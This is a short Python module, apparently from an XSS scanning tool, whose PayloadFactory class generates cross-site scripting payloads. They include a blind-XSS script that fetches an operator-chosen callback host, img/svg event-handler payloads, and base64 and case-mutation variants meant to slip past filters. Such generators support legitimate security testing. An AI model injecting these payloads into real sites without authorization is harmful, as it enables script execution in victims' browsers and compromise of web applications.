import uuid
import random
import string
import urllib.parse
import base64


class PayloadFactory:

    @staticmethod
    def generate(callback_host, callback_port):
        token = f"XSS_{uuid.uuid4().hex[:8]}"

        payload = (
            f"<script>"
            f"fetch('http://{callback_host}:{callback_port}/"
            f"callback?token={token}')"
            f"</script>"
        )

        return token, payload



    @staticmethod
    def _random_token(length=8):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    @classmethod
    def generate_multiple(cls, callback_host, callback_port):
        token = cls._random_token()

        callback_url = f"http://{callback_host}:{callback_port}/callback?token={token}"

        payloads = []

        # ---------------------------------
        # Basico
        # ---------------------------------
        basic = f"<script>alert('{token}')</script>"
        payloads.append((token, basic))

        # ---------------------------------
        # Blind XSS (callback real)
        # ---------------------------------
        blind = f"<script>fetch('{callback_url}')</script>"
        payloads.append((token, blind))

        # ---------------------------------
        # IMG OnError
        # ---------------------------------
        img = f"<img src=x onerror=alert('{token}')>"
        payloads.append((token, img))

        # ---------------------------------
        # SVG Payload
        # ---------------------------------
        svg = f"<svg/onload=alert('{token}')>"
        payloads.append((token, svg))

        # ---------------------------------
        # URL Encoded
        # ---------------------------------
        encoded = urllib.parse.quote(basic)
        payloads.append((token, encoded))

        # ---------------------------------
        # Base64 Eval
        # ---------------------------------
        js = f"alert('{token}')"
        encoded_js = base64.b64encode(js.encode()).decode()
        b64_payload = f"<script>eval(atob('{encoded_js}'))</script>"
        payloads.append((token, b64_payload))

        # ---------------------------------
        # Case Mutation
        # ---------------------------------
        mutated = f"<ScRiPt>alert('{token}')</ScRiPt>"
        payloads.append((token, mutated))

        return payloads